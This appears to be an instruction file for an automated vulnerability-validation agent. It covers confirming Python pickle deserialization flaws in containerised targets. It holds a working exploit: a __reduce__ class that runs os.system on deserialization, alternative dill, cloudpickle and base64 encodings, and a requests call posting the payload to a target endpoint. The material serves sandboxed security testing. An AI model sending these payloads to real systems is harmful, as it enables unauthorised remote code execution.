---
name: validate-pickle-deserialization
description: >
  Validate Python pickle deserialization vulnerabilities by crafting a malicious pickle
  payload that executes /tmp/invoke on deserialization. Confirms via /tmp/pickle_rce_<id>
  marker file or PICKLE_CONFIRMED output. Python targets only — auto-skip for other languages.
origin: vuln-analysis
---

# Validator: Pickle Deserialization (Python Only)

Confirm whether a Python application deserializes attacker-controlled `pickle` / `dill` / `cloudpickle` data that leads to arbitrary code execution.

## When to Activate

- A `pickle_deserialization` vulnerability needs validation (Steps 7/8)
- **ONLY for Python targets** — skip entirely if `target.json → language != "python"`

## Distinction from `insecure_deserialization`

| Type | Language | Vectors | Attack |
|------|----------|---------|--------|
| `pickle_deserialization` | Python only | `pickle.loads`, `dill.loads`, `cloudpickle.loads` | Craft malicious `__reduce__` payload → RCE on deserialization |
| `insecure_deserialization` | All languages | Java ObjectInputStream, Ruby Marshal.load, PHP unserialize, Python yaml.load | Language-specific gadget chain |

## Prerequisites

```bash
# Deploy trigger binary
docker cp skills/_shared/trigger.linux <container>:/tmp/invoke
docker exec <container> chmod +x /tmp/invoke

# Set up marker file listener (pickle payload writes /tmp/pickle_rce_<id>)
MARKER_ID=$(python3 -c "import uuid; print(uuid.uuid4().hex[:8])")
```

## Payload Construction

The PoC must craft a malicious pickle payload using Python's `__reduce__` protocol:

```python
import pickle
import os

MARKER_ID = "<8-char hex id>"

class PickleExploit:
    """Malicious pickle payload — executes /tmp/invoke on deserialization."""
    def __reduce__(self):
        # Write marker file as proof of execution
        cmd = f"/tmp/invoke && touch /tmp/pickle_rce_{MARKER_ID}"
        return (os.system, (cmd,))

# Serialize
payload_bytes = pickle.dumps(PickleExploit())

# Send to vulnerable endpoint
import requests
response = requests.post(
    f"{TARGET}/api/endpoint",
    data=payload_bytes,
    headers={"Content-Type": "application/octet-stream"},
)
```

**Alternative serializers** (try if `pickle` format is rejected):
```python
import dill
payload = dill.dumps(PickleExploit())

import cloudpickle
payload = cloudpickle.dumps(PickleExploit())

# Base64-encoded pickle (common in web apps that decode before loading)
import base64
payload_b64 = base64.b64encode(pickle.dumps(PickleExploit())).decode()
```

## Success Criteria

| Result | Condition |
|--------|-----------|
| **[CONFIRMED]** | `/tmp/pickle_rce_<id>` file exists in container AND listener on 59875 received `test_message` |
| **[CONFIRMED]** | `PICKLE_CONFIRMED` in PoC output |
| **[PARTIAL]** | PoC receives `500 Internal Server Error` with pickle-related traceback (deserialization reached but failed) |
| **[NOT_REPRODUCED]** | No marker file, no confirmation output, endpoint rejects binary data |

## Verification Steps

```bash
# Step 1: Send payload
docker exec <container> python3 /workspace/poc_scripts/poc_pickle_deserialization_001.py

# Step 2: Check marker file
docker exec <container> test -f /tmp/pickle_rce_${MARKER_ID} && echo "PICKLE_CONFIRMED"

# Step 3: Legitimacy check — verify deserialization happened INSIDE the target app
docker exec <container> grep -r "pickle.loads\|dill.loads\|cloudpickle.loads" /app/
# Confirm: vulnerable line is in original source, not in test harness
```

## Legitimacy Check (Anti-Cheat — MANDATORY)

Before marking `[CONFIRMED]`:
1. **Source authenticity**: The `pickle.loads()` call that executed the payload MUST be in the original cloned repository — not in any builder-created endpoint
2. **Network path**: The payload reached `pickle.loads()` through an HTTP request to the target app — not by directly calling `pickle.loads()` in the PoC script itself
3. **No direct API calls**: PoC MUST NOT call `pickle.loads(payload)` directly — it must send the payload to the target's HTTP endpoint

**INVALID** (will be marked `[INVALID]`):
```python
# WRONG: calling pickle.loads directly in PoC
import pickle
result = pickle.loads(payload)  # This calls the PoC's own Python, not the target app
```

**VALID**:
```python
# RIGHT: sending payload to target HTTP endpoint
response = requests.post(f"{target}/api/model/load", data=payload)
# The target app calls pickle.loads() on our payload
```

## Evidence Hierarchy

1. `/tmp/pickle_rce_<id>` file exists → **CONFIRMED** (strongest)
2. TCP callback on port 59875 received `test_message` → **CONFIRMED**
3. `PICKLE_CONFIRMED` in PoC stdout → **CONFIRMED**
4. 500 error with `pickle`, `_reconstruct`, `__reduce__` in traceback → **PARTIAL** (deserialization attempted, may be blocked by version/format mismatch)
5. 415 Unsupported Media Type / 400 Bad Request → **NOT_REPRODUCED** (endpoint doesn't accept raw pickle)

## CVSS

`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → **9.8 (CRITICAL)**

(Unauthenticated network-accessible RCE via Python pickle deserialization)

If authentication is required: `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` → **8.8 (HIGH)**
